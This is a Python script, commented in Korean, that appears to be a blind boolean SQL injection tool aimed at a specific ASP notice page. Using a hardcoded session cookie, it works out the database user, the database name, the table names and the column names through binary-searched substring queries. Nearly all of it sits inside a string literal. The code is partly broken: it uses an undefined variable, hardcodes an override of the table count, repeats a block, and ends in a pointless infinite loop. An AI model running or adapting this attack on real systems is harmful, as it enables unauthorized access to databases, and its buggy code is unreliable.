import http.client
import urllib.parse

"""
# 대상 URL
url = ""
# 연결 요청
conn = http.client.HTTPConnection(url)
# 요청 헤더, 사전형
headers = {"Cookie" : "ASPSESSIONIDASDCRBAC=JCPBOCECJJIGLELGAEGLBLLH"}

# 현재 사용자명 길이
user_len = 0
for i in range(1, 100):
    query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and " + str(i) + "=len((select user))", "/?=")
    conn.request("GET", query, None, headers)
    res = conn.getresponse()
    st = res.read().decode('euc-kr')
    if (st.find("안녕하세요.") != -1):
        user_len = i
        break

print("현재 사용자 계정 길이:", user_len)

db_id = ""
for i in range(1, id_len + 1):
    low = 48 # 0
    high = 122 # z
    while (True):
        mid = int((low + high) / 2)
        #print(mid)
        query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and '" + str(mid) + "'<ascii(substring((select user)," + str(i) + ",1))", "/?=")
        conn.request("GET", query, None, headers)
        res = conn.getresponse()
        st = res.read().decode('euc-kr')
        if (st.find("안녕하세요.") != -1):
            low = mid + 1
    
        query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and '" + str(mid) + "'=ascii(substring((select user)," + str(i) + ",1))", "/?=")
        conn.request("GET", query, None, headers)
        res = conn.getresponse()
        st = res.read().decode('euc-kr')
        if (st.find("안녕하세요.") != -1):
            db_id += chr(mid)
            break

        query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and '" + str(mid) + "'>ascii(substring((select user)," + str(i) + ",1))", "/?=")
        conn.request("GET", query, None, headers)
        res = conn.getresponse()
        st = res.read().decode('euc-kr')
        if (st.find("안녕하세요.") != -1):
            high = mid - 1

print("현재 사용자 계정:", db_id)

db_len = 0
for i in range(1, 100):
    query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and +" + str(i) + "=len((select db_name()))", "/?=")
    conn.request("GET", query, None, headers)
    res = conn.getresponse()
    st = res.read().decode('euc-kr')
    if (st.find("안녕하세요.") != -1):
        db_len = i
        break

print("데이터베이스 길이:", db_len)

db_name = ""
for i in range(1, db_len + 1):
    low = 48 # 0
    high = 122 # z
    while (True):
        mid = int((low + high) / 2)
        #print(mid)
        query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and '" + str(mid) + "'<ascii(substring((select db_name())," + str(i) + ",1))", "/?=")
        conn.request("GET", query, None, headers)
        res = conn.getresponse()
        st = res.read().decode('euc-kr')
        if (st.find("안녕하세요.") != -1):
            low = mid + 1
    
        query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and '" + str(mid) + "'=ascii(substring((select db_name())," + str(i) + ",1))", "/?=")
        conn.request("GET", query, None, headers)
        res = conn.getresponse()
        st = res.read().decode('euc-kr')
        if (st.find("안녕하세요.") != -1):
            db_name += chr(mid)
            break

        query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and '" + str(mid) + "'>ascii(substring((select db_name())," + str(i) + ",1))", "/?=")
        conn.request("GET", query, None, headers)
        res = conn.getresponse()
        st = res.read().decode('euc-kr')
        if (st.find("안녕하세요.") != -1):
            high = mid - 1

print("데이터베이스명:", db_name)

total_table_count = 0
for i in range(1, 1000):
    query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and " + str(i) + "=(SELECT count(rnum) from (SELECT row_number() over (order by name desc) rnum, name FROM sysobjects WHERE xtype = 'U')t)--", "/?=")
    conn.request("GET", query, None, headers)
    res = conn.getresponse()
    st = res.read().decode('euc-kr')
    if (st.find("안녕하세요.") != -1):
        total_table_count = i
        break

print("전체 테이블 수:", total_table_count)

total_table_count = 104

table_length = 0

f = open("C:/Users/dmlwj/Desktop/table_name.txt", "w")
for tcount in range(1, total_table_count + 1):
    print("{0:3}번째 테이블명:".format(tcount), end="")

    for i in range(1, 100):
        query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and " + str(i) + "=len((SELECT name from (SELECT row_number() over (order by name desc) rnum, name FROM sysobjects WHERE xtype = 'U')t where t.rnum=" + str(tcount) +"))--", "/?=")
        conn.request("GET", query, None, headers)
        res = conn.getresponse()
        st = res.read().decode('euc-kr')

        if (st.find("안녕하세요.") != -1):
            table_length = i
            table_name = ""
            for i in range(1, table_length + 1):
                low = 48 # 0
                high = 122 # z
                while (True):
                    mid = int((low + high) / 2)
                    query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and '" + str(mid) + "'<ascii(substring((SELECT name from (SELECT row_number() over (order by name desc) rnum, name FROM sysobjects WHERE xtype = 'U')t where t.rnum=" + str(tcount) +")," + str(i) + ",1))--", "/?=")
                    conn.request("GET", query, None, headers)
                    res = conn.getresponse()
                    st = res.read().decode('euc-kr')
                    if (st.find("안녕하세요.") != -1):
                        low = mid + 1
                
                    query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and '" + str(mid) + "'=ascii(substring((SELECT name from (SELECT row_number() over (order by name desc) rnum, name FROM sysobjects WHERE xtype = 'U')t where t.rnum=" + str(tcount) +")," + str(i) + ",1))--", "/?=")
                    conn.request("GET", query, None, headers)
                    res = conn.getresponse()
                    st = res.read().decode('euc-kr')
                    if (st.find("안녕하세요.") != -1):
                        table_name += chr(mid)
                        break

                    query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and '" + str(mid) + "'>ascii(substring((SELECT name from (SELECT row_number() over (order by name desc) rnum, name FROM sysobjects WHERE xtype = 'U')t where t.rnum=" + str(tcount) +")," + str(i) + ",1))--", "/?=")
                    conn.request("GET", query, None, headers)
                    res = conn.getresponse()
                    st = res.read().decode('euc-kr')
                    if (st.find("안녕하세요.") != -1):
                        high = mid - 1

            print(table_name)
            f.write(table_name + "\n")
            break
f.close()

f = open("C:/Users/finss/Desktop/table_name.txt", "r")
ccount = 0
for table_name in f:
    table_name = table_name.split('\n')[0]
    # 컬럼 수
    column_count = 0
    for i in range(1, 100):
        query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and " + str(i) + "=(SELECT count(rnum) from (SELECT row_number() over (order by name) rnum, * FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '" + table_name + "'))t)--", "/?=")
        conn.request("GET", query, None, headers)
        res = conn.getresponse()
        st = res.read().decode('euc-kr')
        if (st.find("안녕하세요.") != -1):
            column_count = i
            break

    print("{0:32} 컬럼 수:".format(table_name), column_count)
    # 컬럼 수 만큼 반복
    for col_count in range(1, column_count + 1):
        # 한 컬럼 길이
        column_len = 0
        for i in range(1, 100):
            query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and " + str(i) + "=len((SELECT name from (SELECT row_number() over (order by name) rnum, * FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '" + table_name + "'))t where t.rnum=" + str(col_count) + "))--", "/?=")
            conn.request("GET", query, None, headers)
            res = conn.getresponse()
            st = res.read().decode('euc-kr')
            if (st.find("안녕하세요.") != -1):
                column_len = i
                print("컬럼 길이:", column_len)
                break
        # 한 컬럼명
        column_name = ""
        for c_len in range(1, column_len + 1):
            low = 32 # 0
            high = 122 # z
            while (True):
                mid = int((low + high) / 2)
                query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and " + str(mid) + "<ascii(substring((SELECT name from (SELECT row_number() over (order by name) rnum, name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '" + table_name + "'))t where t.rnum=" + str(col_count) + ")," + str(c_len) +",1))--", "/?=")
                conn.request("GET", query, None, headers)
                res = conn.getresponse()
                st = res.read().decode('euc-kr')
                if (st.find("안녕하세요.") != -1):
                    low = mid + 1
            
                query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and " + str(mid) + "=ascii(substring((SELECT name from (SELECT row_number() over (order by name) rnum, name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '" + table_name + "'))t where t.rnum=" + str(col_count) + ")," + str(c_len) +",1))--", "/?=")
                conn.request("GET", query, None, headers)
                res = conn.getresponse()
                st = res.read().decode('euc-kr')
                if (st.find("안녕하세요.") != -1):
                    column_name += chr(mid)
                    print(column_name)
                    break

                query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and " + str(mid) + ">ascii(substring((SELECT name from (SELECT row_number() over (order by name) rnum, name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '" + table_name + "'))t where t.rnum=" + str(col_count) + ")," + str(c_len) +",1))--", "/?=")
                conn.request("GET", query, None, headers)
                res = conn.getresponse()
                st = res.read().decode('euc-kr')
                if (st.find("안녕하세요.") != -1):
                    high = mid - 1

f.close()

f = open("C:/Users/finss/Desktop/table_name.txt", "r")
ccount = 0
for table_name in f:
    table_name = table_name.split('\n')[0]
    # 컬럼 수
    column_count = 0
    for i in range(1, 100):
        query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and " + str(i) + "=(SELECT count(rnum) from (SELECT row_number() over (order by name) rnum, * FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '" + table_name + "'))t)--", "/?=")
        conn.request("GET", query, None, headers)
        res = conn.getresponse()
        st = res.read().decode('euc-kr')
        if (st.find("안녕하세요.") != -1):
            column_count = i
            break

    print("{0:32} 컬럼 수:".format(table_name), column_count)
    # 컬럼 수 만큼 반복
    for col_count in range(1, column_count + 1):
        # 한 컬럼 길이
        column_len = 0
        for i in range(1, 100):
            query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and " + str(i) + "=len((SELECT name from (SELECT row_number() over (order by name) rnum, * FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '" + table_name + "'))t where t.rnum=" + str(col_count) + "))--", "/?=")
            conn.request("GET", query, None, headers)
            res = conn.getresponse()
            st = res.read().decode('euc-kr')
            if (st.find("안녕하세요.") != -1):
                column_len = i
                print("컬럼 길이:", column_len)
                break
        # 한 컬럼명
        column_name = ""
        for c_len in range(1, column_len + 1):
            low = 32 # 0
            high = 122 # z
            while (True):
                mid = int((low + high) / 2)
                query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and " + str(mid) + "<ascii(substring((SELECT name from (SELECT row_number() over (order by name) rnum, name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '" + table_name + "'))t where t.rnum=" + str(col_count) + ")," + str(c_len) +",1))--", "/?=")
                conn.request("GET", query, None, headers)
                res = conn.getresponse()
                st = res.read().decode('euc-kr')
                if (st.find("안녕하세요.") != -1):
                    low = mid + 1
            
                query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and " + str(mid) + "=ascii(substring((SELECT name from (SELECT row_number() over (order by name) rnum, name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '" + table_name + "'))t where t.rnum=" + str(col_count) + ")," + str(c_len) +",1))--", "/?=")
                conn.request("GET", query, None, headers)
                res = conn.getresponse()
                st = res.read().decode('euc-kr')
                if (st.find("안녕하세요.") != -1):
                    column_name += chr(mid)
                    print(column_name)
                    break

                query = urllib.parse.quote("/smartaca/notice_c.asp?idx=4 and " + str(mid) + ">ascii(substring((SELECT name from (SELECT row_number() over (order by name) rnum, name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '" + table_name + "'))t where t.rnum=" + str(col_count) + ")," + str(c_len) +",1))--", "/?=")
                conn.request("GET", query, None, headers)
                res = conn.getresponse()
                st = res.read().decode('euc-kr')
                if (st.find("안녕하세요.") != -1):
                    high = mid - 1

f.close()

"""
a = 0.0
while (True):
    a *= 0.0